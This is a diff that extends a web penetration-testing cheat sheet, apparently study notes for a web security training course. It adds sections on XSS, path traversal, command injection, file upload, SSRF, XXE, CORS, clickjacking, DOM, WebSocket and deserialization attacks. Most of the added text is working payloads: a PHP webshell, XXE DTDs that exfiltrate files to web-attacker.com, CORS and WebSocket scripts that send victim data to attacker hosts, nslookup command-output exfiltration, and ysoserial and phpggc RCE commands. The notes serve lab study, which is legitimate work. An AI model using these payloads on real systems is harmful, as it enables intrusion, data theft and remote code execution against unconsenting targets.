@@ -124,6 +124,9 @@
   '; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
 
 ## XSS
+  ### Basic tests
+    <script>alert(document.domain)</script>
+    <img src=1 onerror=alert(1)>
 
   ### Steal cookie
 
@@ -161,28 +164,392 @@
 
   ### Reflected XSS into HTML context with most tags and attributes blocked
 
-  Use Burp Intruder to test which tags and attributes are being blocked:
+   - Use Burp Intruder to test which tags and attributes are being blocked:
 
   * Use "copy tags to clipboard" from xss cheatsheet to bruteforce tags
   * Use "copy events to clipboard" from xss cheatsheet, and change the payload
     for instance: <body%20$$=1>
   * Then setup the attack with found tag and event
     for instance:
-    <iframe src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=alert(document.cookie)%3E" onload=this.style.width='100px'>
+    <iframe src="https://attacker-website.com/?search=%22%3E%3Cbody%20onresize=alert(document.cookie)%3E" onload=this.style.width='100px'>
+
+   - Custom Tags
+   <script>
+   location = 'https://attaquer-website.com/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+   </script>
 
 ## Authentication
 
-  ## Tips to bypass IP-based brute force protection
+  ### Tips to bypass IP-based brute force protection
     * X-Forwarded-For: [Random IP]
     -> Act as if you were a proxy for other clients
 
     * Sometimes logging to a real account reset the IP ban 
 
-  ## Look for timing based information leak
+  ### Look for timing based information leak
     -> Set a long password and bruteforce usernames
 
-  ## Look for weak structures in "stay-logged-in" cookies
+  ### Look for weak structures in "stay-logged-in" cookies
     -> For instance b64(username:md5(password))
+
+## Path traversal
+
+  ### Simple path traversal
+    https://insecure-website.com/loadImage?filename=../../../etc/passwd
+    https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini 
+
+  ### Common obstacles
+    - filename=..%2f -> url encoding
+    - filename=/etc/passwd -> absolute path
+    - filename=....//blabla.txt -> nested traversal sequence
+    - filename=..%c0%af -> overlong UTF-8 encoding
+    - filename=..%252f -> double URL encoding
+    - filename=..%u2215 -> 16-bit unicode encoding
+    - filename=/var/www/images/../../../etc/passwd -> validation of start path
+    - filename=../../../etc/passwd%00.png -> null byte
+
+## OS command injection
+
+  - inject command between & or || -> & echo test &
+  
+  ## blind command injection
+    - || ping -c 4 127.0.0.1 || -> time based command
+    - || whoami > /var/www/static/whoami.txt || -> redirecting output
+    - || nslookup collaborator.net || -> out of band technique
+    - || nslookup `whoami`.collaborator.net || -> exfiltrate command output
+
+
+## Access control
+
+  ### Vertical privesc
+    - https://insecure.com/admin -> direct access
+    - check robots.txt
+    - https://insecure.com/administrator-panel-yb556 -> search in js code
+    - https://insecure.com/login/home.jsp?admin=true
+    - User role from user profile (check for json in response)
+    - POST / HTTP/1.1
+      X-Original-URL: /admin
+    - switch from POST to GET request (sometimes only one is forbidden)
+
+  ### Horizontal privesc
+    - https://insecure-website.com/myaccount?id=123 -> change id
+    - if id is GUID, search for other users GUID elsewhere (message, review..)
+    - search for information in redirect if accessing directly is forbidden
+
+    - multi step process with no access control on one step
+    - referer based access control
+    - location based access control
+ 
+## File upload
+
+  Simple poc: <?php echo file_get_contents('/path/to/target/file'); ?>
+  Webshell poc: <?php system($_GET["cmd"]); ?>
+
+  - Change content type
+  - Path traversal in file upload
+
+  - Try to upload .htaccess file with content:
+      AddType application/x-httpd-php .l33t
+  - Case sensistive blacklist: try pHp
+  - file.php.jpg
+  - file.php.
+  - file%2Ephp
+  - file.php5 and so on
+  - file.p.phphp (extension stripping)
+  - file.php%00.jpg
+  - file%C0%2Ephp
+  - file.php;.jpg
+  - add jpg magic bytes in the beginning of file
+  - race condition: executing file before it is removed
+  - PUT and OPTIONS to check for unattended HTTP verb
+
+## SSRF
+
+  - bypass blacklist input filters
+    127.0.0.1 -> 2130706433, 017700000001, 127.1, spoofed.burpcollaborator.net
+    obfuscating blocked strings using URL encoding or case variation
+
+  - bypass whitelist input filters
+    https://expected-host@evil
+    https://evil-host#expected-host
+    https://expected-host.evil-host
+    URL encode characters
+
+  - bypass SSRF filters with open redirection
+
+  - blind SSRF -> collaborator
+
+## XXE
+
+  ### Example
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+  <stockCheck><productId>&xxe;</productId></stockCheck>
+
+  ### CSRF
+  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://otherwebsite.com"> ]>
+
+  ### Blind XXE - XML parameter entities
+  Can only be referenced elsewhere in the DTD
+  <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://web-attacker.com"> %xxe; ]>
+
+  ### Blind XXE - Exfiltrate data
+  First step: DTD payload to be hosted on malicious server
+    <!ENTITY % file SYSTEM "file:///etc/hostname">
+    <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
+    %eval;
+    %exfiltrate;
+  Second step: Fetch the DTD file using XML parameter entities
+    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
+
+  ### Blind XXE - Error based
+  First step: DTD payload to be hosted on malicious server
+    <!ENTITY % file SYSTEM "file:///etc/passwd">
+    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+    %eval;
+    %error;
+  Second step: Fetch the DTD file using XML parameter entities
+    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
+
+  ### Blind XXE - Repurposing a local DTD
+    Uses an error based XXE. Look for local DTD file, like
+    <!DOCTYPE foo [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> %local_dtd;
+    ]>
+    Then redifine a custom entity defined in this DTD with something like
+    <!DOCTYPE foo [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
+    <!ENTITY % custom_entity '
+    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+    &#x25;eval;
+    &#x25;error;
+    '>
+    %local_dtd;
+    ]>
+
+  ## If user input isn't direct XML, but is parsed as XML
+    - XInclude:
+    <foo xmlns:xi="http://www.w3.org/2001/XInclude">
+    <xi:include parse="text" href="file:///etc/passwd"/></foo>
+
+  ## XXE in SVG for file upload:
+    <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+
+  ## XXE via modified content type:
+    POST /action HTTP/1.0
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 7
+
+    foo=bar
+
+    turned into
+
+    POST /action HTTP/1.0
+    Content-Type: text/xml
+    Content-Length: 52
+
+    <?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
+
+## CORS
+
+    ### Server-generated ACAO header from client-specified Origin header
+
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
+    req.withCredentials = true;
+    req.send();
+
+    function reqListener() {
+       location='//malicious-website.com/log?key='+this.responseText;
+    };
+
+    ### Errors parsing Origin headers
+
+    normal-website.com -> hackersnormal-website.com
+    normal-website.com -> normal-website.com.evil-user.net
+
+    ### Whitelisted null origin value
+
+    - Cross-origin redirects.
+    - Requests from serialized data.
+    - Request using the file: protocol.
+    - Sandboxed cross-origin requests.
+
+    Sandboxed iframe cross-origin request:
+
+    <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','vulnerable-website.com/sensitive-victim-data',true);
+    req.withCredentials = true;
+    req.send();
+
+    function reqListener() {
+    location='malicious-website.com/log?key='+this.responseText;
+    };
+    </script>"></iframe>
+
+    ### Exploiting XSS via CORS trust relationships 
+
+    ### Breaking TLS with poorly configured CORS
+     -> with MITM
+     -> with XSS
+
+## Clickjacking
+
+    ### Basic clickjacking attack
+        <head>
+            <style>
+                #target_website {
+                    position:relative;
+                    width:128px;
+                    height:128px;
+                    opacity:0.00001;
+                    z-index:2;
+                    }
+                #decoy_website {
+                    position:absolute;
+                    width:300px; // or top
+                    height:400px; // or left
+                    z-index:1;
+                    }
+            </style>
+        </head>
+        ...
+        <body>
+            <div id="decoy_website">
+            ...decoy web content here...
+            </div>
+            <iframe id="target_website" src="https://vulnerable-website.com">
+            </iframe>
+        </body>
+
+    ### Clickjacking with prefilled form input
+        -> check for prefilled form input with GET parameter
+
+    ### Frame busting scripts
+        -> <iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>
+
+
+## DOM-based vulnerabilities
+    
+    Principle:
+
+    - Search for an attacker-controlled _source_ (see examples below) that goes
+    to a _sink_
+
+    - Example of a sink:
+
+        goto = location.hash.slice(1)
+        if (goto.startsWith('https:')) {
+          location = goto;
+        }
+
+    -> https://www.innocent-website.com/example#https://www.evil-user.net
+
+    - Common sources:
+
+    document.URL
+    document.documentURI
+    document.URLUnencoded
+    document.baseURI
+    location
+    document.cookie
+    document.referrer
+    window.name
+    history.pushState
+    history.replaceState
+    localStorage
+    sessionStorage
+    IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
+    Database
+
+    - Common sinks:
+
+    DOM-based vulnerability 	        Example sink
+
+    DOM XSS LABS 	                    document.write()
+    Open redirection LABS 	            window.location
+    Cookie manipulation LABS 	        document.cookie
+    JavaScript injection 	            eval()
+    Document-domain manipulation 	    document.domain
+    WebSocket-URL poisoning 	        WebSocket()
+    Link manipulation 	                element.src
+    Web message manipulation 	        postMessage()
+    Ajax request-header manipulation 	setRequestHeader()
+    Local file-path manipulation 	    FileReader.readAsText()
+    Client-side SQL injection 	        ExecuteSql()
+    HTML5-storage manipulation 	        sessionStorage.setItem()
+    Client-side XPath injection 	    document.evaluate()
+    Client-side JSON injection 	        JSON.parse()
+    DOM-data manipulation 	            element.setAttribute()
+    Denial of service 	                RegExp()
+
+    - DOM XSS using web message
+
+    -> search for "window.addEventListener('message', function(e)"
+    -> may be exploitable if no good check for origin is done
+
+    example vulnerable script:
+    <script>
+        window.addEventListener('message', function(e) {
+          eval(e.data);
+        });
+    </script>
+    exploit to put on exploit server:
+    <iframe src="https://vuln-url/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
+
+    javascript:print()//http:
+
+## WebSocket
+
+    If WebSocket handshake doesn't rely on CSRF token
+    -> Cross-site WebSocket hijacking
+
+    Gives attacker a 2-way interaction as the compromised user with the
+    vulnerable application
+
+    PoC:
+
+    <script>
+        var ws = new WebSocket('wss://websocket-url');
+        ws.onopen = function() {
+            ws.send("READY");
+        };
+        ws.onmessage = function(event) {
+            fetch('https://burp-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
+        };
+    </script>
+
+## Insecure Deserialization
+
+    PHP Serialization syntax 
+        O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}
+    Java Serialization object:
+        Base64 starts with rO0
+    Java Serialization object:
+        Base64 stars with BAh
+
+    * Check for loose comparison
+
+    $login = unserialize($_COOKIE)
+    if ($login['password'] == $password) {
+    // log in successfully
+    }
+    -> Put a 0 value (integer) as login['password'] in serialized data 
+
+    Ysoserial -> exploit java deserialization vulns
+        java -jar ysoserial.jar CommonsCollections4 'linux command here' | base64 -w 0
+
+    How to know blindly if there is a deserilization vulnerability with Ysoserial?
+         - The URLDNS chain triggers a DNS lookup for a supplied URL. Most importantly, it does not rely on the target application using a specific vulnerable library and works in any known Java version. This makes it the most universal gadget chain for detection purposes. If you spot a serialized object in the traffic, you can try using this gadget chain to generate an object that triggers a DNS interaction with the Burp Collaborator server. If it does, you can be sure that deserialization occurred on your target.
+
+         - JRMPClient is another universal chain that you can use for initial detection. It causes the server to try establishing a TCP connection to the supplied IP address. Note that you need to provide a raw IP address rather than a hostname. This chain may be useful in environments where all outbound traffic is firewalled, including DNS lookups. You can try generating payloads with two different IP addresses: a local one and a firewalled, external one. If the application responds immediately for a payload with a local address, but hangs for a payload with an external address, causing a delay in the response, this indicates that the gadget chain worked because the server tried to connect to the firewalled address. In this case, the subtle time difference in responses can help you to detect whether deserialization occurs on the server, even in blind cases.
+
+    PHP Generic Gadget Chains -> exploit php deserialization vulns
+        ./phpggc Symfony/RCE4 exec 'linux command here' | base64 -w 0
 
 ## Node dependencies
 
